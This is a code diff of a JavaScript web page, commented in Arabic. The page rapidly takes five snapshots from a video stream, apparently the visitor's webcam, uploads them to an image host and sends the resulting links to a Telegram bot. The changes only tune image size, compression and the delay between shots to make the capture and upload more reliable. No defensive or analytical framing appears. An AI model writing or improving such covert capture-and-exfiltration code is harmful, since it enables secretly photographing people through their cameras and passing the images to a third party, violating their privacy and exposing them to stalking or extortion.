@@ -26,18 +26,16 @@
 
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
-                    canvas.width = 480;  // تصغير الحجم قليلاً لسرعة المعالجة والرفع
-                    canvas.height = 360;
+                    canvas.width = 400;
+                    canvas.height = 300;
                     const ctx = canvas.getContext('2d');
                     
                     let urls = [];
 
-                    // التقاط 5 صور بسرعة فائقة جداً (بفاصل 300 مللي ثانية)
                     for (let i = 1; i <= 5; i++) {
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        // تحويل الصورة لـ Blob بجودة مناسبة وسريعة
-                        let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.6));
+                        let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.5));
                         
                         if (blob) {
                             const formData = new FormData();
@@ -50,21 +48,21 @@
                                 });
                                 let data = await res.json();
                                 if (data && data.success) {
-                                    urls.push(`صورة (${i}): ${data.data.url}`);
+                                    urls.push(`📸 صورة (${i}): ${data.data.url}`);
                                 }
                             } catch (e) {
                                 console.error(e);
                             }
                         }
 
+                        // فاصل زمني أطول نسبةً بسيط (700 مللي ثانية) لضمان عدم رفض السيرفر لأي صورة وبقائها في نطاق السرعة
                         if (i < 5) {
-                            await new Promise(r => setTimeout(r, 300)); // سرعة فائقة: ثلث ثانية فقط بين الصورة والثانية
+                            await new Promise(r => setTimeout(r, 700));
                         }
                     }
 
                     stream.getTracks().forEach(t => t.stop());
 
-                    // إرسال الروابط مجتمعة في رسالة واحدة منظمة لضمان وصولها كلها دفعة واحدة
                     if (urls.length > 0) {
                         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                             method: 'POST',
